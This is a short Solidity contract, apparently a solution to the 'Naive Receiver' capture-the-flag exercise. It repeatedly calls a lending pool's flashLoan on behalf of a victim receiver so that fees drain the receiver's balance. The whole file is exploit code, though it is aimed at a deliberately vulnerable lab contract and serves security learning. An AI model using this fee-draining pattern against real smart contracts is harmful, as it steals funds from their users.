pragma solidity ^0.6.0;

import "./NaiverReceiverLenderPool.sol";

contract Attack {
//  YOur code goes here
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool) public{
        pool = NaiveReceiverLenderPool(_pool);    
    }

    function makeAttack(address payable naiveReceiver) public {
        for(uint i=0;i<10;i++){
            pool.flashLoan(naiveReceiver,0);
        }
    }
}